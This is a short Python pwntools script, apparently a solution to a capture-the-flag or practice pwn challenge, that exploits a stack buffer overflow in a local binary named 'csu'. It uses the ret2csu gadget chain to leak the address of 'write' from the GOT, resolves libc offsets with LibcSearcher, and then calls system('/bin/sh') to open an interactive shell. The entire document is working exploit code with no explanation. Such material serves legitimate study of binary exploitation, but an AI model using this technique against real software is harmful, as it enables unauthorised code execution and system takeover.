from pwn import *
from LibcSearcher import *
p=process('./csu')
e=ELF('./csu')
main_addr=e.symbols['main']
write_got=e.got['write']
read_got=e.got['read']
bss_addr=0x404038
csu_front_addr=0x400600
csu_end_addr=0x4006a1
def csu(rbx,rbp,r12,r13,r14,r15,last):
        payload='a'*(0x88)+p64(csu_end_addr)
        payload+=p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)+p64(csu_front_addr)
        payload+='a'*(0x38)
        payload+=p64(last)
        p.sendline(payload)
        sleep(1)
p.recvuntil('Hello, World\n')
csu(0,1,write_got,8,write_got,1,main_addr)
temp=p.recv(8)
write_addr=u64(temp[0:8])
libc=LibcSearcher('write',write_addr)
libcbase=write_addr-libc.dump('write')
sys_addr=libcbase+libc.dump('system')
binsh_addr=libcbase+libc.dump('str_bin_sh')
csu(0,1,sys_addr,0,0,binsh_addr,main_addr)
p.interactive()
